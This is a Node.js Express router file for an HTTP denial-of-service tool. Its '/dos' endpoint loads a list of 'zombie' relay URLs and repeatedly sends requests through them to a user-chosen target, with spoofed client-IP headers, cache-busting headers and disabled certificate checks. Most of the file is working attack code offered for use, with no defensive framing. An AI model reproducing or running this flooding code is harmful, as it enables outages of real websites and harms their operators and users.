const { Router } = require('express');
const axios = require('axios');
const bot = require('../../botnet/zombies.json');
const chalk = require('chalk');
const publicIPv4 = require("public-ipv4");
const https = require('https');
const fakeUA = require('../utils/randomUserAgent'); 

module.exports = class Dos extends Router {
    constructor(server) {
        super(server);
        this.server = server;

        this.get('/exit', () => process.exit());

        this.get('/dos', async (req, res) => {
            if (!req.query.domain) return res.json({
                message: 'Set the domain in the query',
                code: 400
            });
            if (!req.query.option) return res.json({
                message: 'Set an options',
                code: 400
            });

            if (!req.query.domain.match(new RegExp(/(https?:\/\/)?([\w\-])+\.{1}([a-zA-Z]{2,63})([\/\w-]*)*\/?\??([^#\n\r]*)?#?([^\n\r]*)/))) return res.json({
                message: 'Set a valid url !',
                code: 300
            });

            const protocol = req.query.domain.split(':');
            if (!['https', 'http'].includes(protocol[0])) return res.json({
                message: `Set the full url: http(s)://${req.query.domain}`
            });

            const url = new URL(req.query.domain);
            if (req.query.option === 'check') {
                let date = Date.now();
                axios.get(url.origin)
                    .then(_res => {
                        return res.json({
                            message: "The host is up",
                            host: url.origin,
                            time: Date.now() - date,
                            code: 200
                        });
                    })
                    .catch(() => {
                        return res.json({
                            message: "The host is down",
                            host: url.origin,
                            time: 0,
                            code: 200
                        });
                    });
            };

            if (req.query.option === 'viewZombies') {
                return res.json({
                    message: `Zombies ready`,
                    number: bot.zombies.length
                })
            };

            if (req.query.option === 'dos') {
                if (!req.query.thread) return res.json({
                    message: 'Set the thread',
                    code: 300
                });
                setTimeout(() => {
                    console.clear();
                    console.log(chalk.green(`             _                      _______                      _`));
                    console.log(chalk.green(`          _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_`));
                    console.log(chalk.green(`         dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  \`Yb`));
                    console.log(chalk.green(`         V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V`));
                    console.log(chalk.green(`                  \`Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'`));
                    console.log(chalk.green(`                   \`YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'`));
                    console.log(chalk.green(`              __     \`YMMM| OP'~"YOOOOOOOOOOOP"~\`YO |MMMP'     __`));
                    console.log(chalk.green(`            ,dMMMb.     ~~' OO     \`YOOOOOP'     OO \`~~     ,dMMMb.`));
                    console.log(chalk.green(`         _,dP~  \`YMba_      OOb      \`OOO'      dOO      _aMMP'  ~Yb._`));
                    console.log(``);
                    console.log(chalk.green(`                     \`YMMMM\\\`OOOo     OOO     oOOO'/MMMMP'`));
                    console.log(chalk.green(`             ,aa.     \`~YMMb \`OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.`));
                    console.log(chalk.green(`           ,dMYYMba._         \`OOOOOOOOOOOOOOOOO'          _,adMYYMb.`));
                    console.log(chalk.green(`          ,MP'   \`YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   \`YM.`));
                    console.log(chalk.green(`          MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       \`YM`));
                    console.log(chalk.green(`          YMb           ~YMMMM\`OOOOI\`\`\`\`\`IOOOOO'/MMMMP~           dMP`));
                    console.log(chalk.green(`           \`Mb.           \`YMMMb\`OOOI,,,,,IOOOO'dMMMP'           ,dM'`));
                    console.log(chalk.green(`             \`'                  \`OObNNNNNdOO'                   \`'`));
                    console.log(chalk.green(`                                   \`~OOOOO~'`));
                    console.log(``);
                    setTimeout(() => console.log(chalk.green(`                        © - https://github.com/NaN2005`)), 1000);

                    setTimeout(() => {
                        setInterval(() => {
                            const zombie = bot.zombies[Math.floor(Math.random() * bot.zombies.length)];
                            axios(zombie + url.href, {
                                method: 'GET',
                                headers: {
                                    'X-Client-IP': publicIPv4.create(),
                                    'Connection': 'Keep-Alive',
                                    'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                                    'Pragma-directive': 'no-cache',
                                    'Cache-directive': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'Pragma': 'no-cache',
                                    'Expires': '0'
                                },
                                httpsAgent: new https.Agent({
                                    rejectUnauthorized: false
                                }, fakeUA())
                            }).then(() => console.log(`${chalk.hex('#ffce00')('   [ ')}${chalk.hex('#119C0E')('Zombie')}${chalk.hex('#ffce00')(' ]   ')}${zombie}${chalk.hex('#00a9db')(url.href)}`))
                                .catch(() => console.log(`${chalk.hex('#ffce00')('   [ ')}${chalk.hex('#b00000')('Zombie')}${chalk.hex('#ffce00')(' ]   ')}${zombie}${chalk.hex('#00a9db')(url.href)}`));
                        }, Number(req.query.thread));
                    }, 3000);
                }, 2000);
            };
        });
    };
};